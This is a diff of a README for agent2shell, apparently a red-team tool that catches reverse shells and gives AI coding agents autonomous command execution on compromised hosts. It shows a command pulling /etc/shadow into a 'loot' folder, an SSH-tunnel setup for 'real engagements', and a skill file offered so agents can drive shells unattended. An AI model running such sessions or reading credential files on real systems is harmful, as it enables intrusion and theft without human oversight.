@@ -43,7 +43,7 @@ agent2shell pull /etc/shadow ./loot/shadow
   <img src="assets/architecture-planes-white.svg#gh-dark-mode-only" width="80%">
 </p>
 
-The operator runs `catch` to listen for a reverse shell. On connection, a Unix domain socket is created. Any process on the same machine can send commands through the socket.
+The operator runs `catch` to listen for a reverse shell. On connection, a Unix socket is created. Any process on the same machine can send commands through the socket. For remote setups, see [Remote Access via SSH Tunnel](#remote-access-via-ssh-tunnel).
 
 ## Commands
 
@@ -163,38 +163,44 @@ Each command produces one line:
 
 ## Remote Access via SSH Tunnel
 
-Run agent2shell on a remote server and control it from your laptop:
+`catch` and `run` can work on the same machine, but for real engagements you typically want `catch` on an internet-exposed server and your AI agent running locally:
 
 ```
-Target -> reverse shell -> EC2 (agent2shell catch) <- SSH tunnel <- Your laptop
+Target -> reverse shell -> VPS (agent2shell catch) <- SSH tunnel <- Your laptop (AI agent)
 ```
+
+Forward the Unix socket over SSH to use agent2shell locally as if the session were on your machine:
 
 ```bash
-# On EC2: start listener
+# On VPS: start listener
 ./agent2shell catch -p 4444
 
-# Target connects to EC2:4444
-
 # On your laptop: forward the Unix socket
-ssh -NL /tmp/a2s-ec2.sock:/tmp/a2s-1.sock -i key.pem user@EC2_IP
+ssh -NL /tmp/a2s-remote.sock:/tmp/a2s-1.sock -i key.pem user@VPS_IP
 
-# Use agent2shell locally
-agent2shell -s /tmp/a2s-ec2.sock run whoami
-agent2shell -s /tmp/a2s-ec2.sock status
-agent2shell -s /tmp/a2s-ec2.sock push ./tool /tmp/tool
+# Use agent2shell locally — same commands, remote session
+agent2shell -s /tmp/a2s-remote.sock run whoami
+agent2shell -s /tmp/a2s-remote.sock status
+agent2shell -s /tmp/a2s-remote.sock push ./tool /tmp/tool
 ```
 
-See `scripts/ec2-create.sh` for automated EC2 lab setup.
+## Skills
 
-## AI Agent Integration
+Skills are instruction files that teach AI coding agents how to use agent2shell. Copy them to your agent's skill directory (e.g., `.claude/skills/` for Claude Code).
 
-Copy the skill to your agent's instruction directory:
+| Skill | Purpose |
+|-------|---------|
+| [reverse-shell-agent](skills/reverse-shell-agent/SKILL.md) | Teaches an AI agent how to use agent2shell — executing commands, transferring files, querying sessions, handling timeouts. Copy this to your agent to enable autonomous reverse shell interaction. |
+| [dev-e2e-testing](skills/dev-e2e-testing/SKILL.md) | Development testing protocol. Provides a tmux-based setup to test agent2shell end-to-end locally after adding features or fixing bugs. For contributors, not end users. |
 
-```bash
-cp -r skills/reverse-shell-agent ~/.claude/skills/
-```
+## Scripts
 
-Claude Code (or any AI agent that reads skill files) will know how to use agent2shell autonomously — executing commands, uploading tools, downloading files, querying session state.
+Infrastructure automation for development and testing.
+
+| Script | Purpose |
+|--------|---------|
+| [ec2-create.sh](scripts/ec2-create.sh) | Spins up attacker + victim EC2 instances with networking, security groups, and SSH access. Designed for testing agent2shell over a real network with SSH tunnels. |
+| [ec2-destroy.sh](scripts/ec2-destroy.sh) | Tears down all resources created by `ec2-create.sh`. |
 
 ## Installation
 
